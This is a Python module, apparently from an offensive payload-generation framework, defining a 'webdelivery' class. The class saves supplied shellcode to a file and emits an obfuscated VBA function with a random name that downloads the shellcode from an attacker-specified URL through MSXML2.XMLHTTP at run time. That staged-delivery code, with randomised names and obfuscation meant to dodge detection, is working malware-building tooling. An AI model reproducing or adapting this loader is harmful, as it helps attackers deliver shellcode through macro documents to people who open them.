import random
import string
import json
from utils.utils import *

class webdelivery:

    def __init__(self, shellcode, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.shellcodeType = type(shellcode).__name__
        if self.shellcodeType == "str":
            self.type = 'String'
            open(outfile, 'w').write(shellcode)
        elif self.shellcodeType == "bytes":
            self.type = f"[u8; {len(shellcode)}]"
            open(outfile, 'wb').write(shellcode)
        elif self.shellcodeType == "list":
            self.type = f"[&'static str; {len(shellcode)}]"
            open(outfile, 'w').write('\n'.join(shellcode))
        print(f'Output saved to {outfile}')
        self.shellcode = globals()[f'{type(shellcode).__name__}_to_vba'](shellcode, 'obfuscated')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def compilerOptions(self):
        return []

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}()')

    def imports(self):
        return []

    def codeblock(self):

        codeblock = f"""
Private Function {self.name}()
    Dim http As Object
    Dim url As String
    Dim response As String
    
    ' Define your endpoint URL
    url = "{self.url}"
    
    ' Create the HTTP object (MSXML2 is built into Windows)
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' Open the connection: Method, URL, Asynchronous (False = Wait for response)
    http.Open "GET", url, False
    
    ' Optional: Set headers if your target API requires them
    http.setRequestHeader "Accept", "application/json"
    
    ' Send the request
    http.send
"""


        if self.shellcodeType == 'bytes':
            codeblock += f"""
    {self.name} = http.responseBody
End Function
"""
        elif self.shellcodeType == 'str':
            codeblock += f"""
    {self.name} = http.responseText
End Function
"""
        elif self.shellcodeType == 'list':
            codeblock += f"""
    Dim lines() As String
    lines = Split(http.responseText, vbLf)
    {self.name} = lines
End Function
"""

        return codeblock
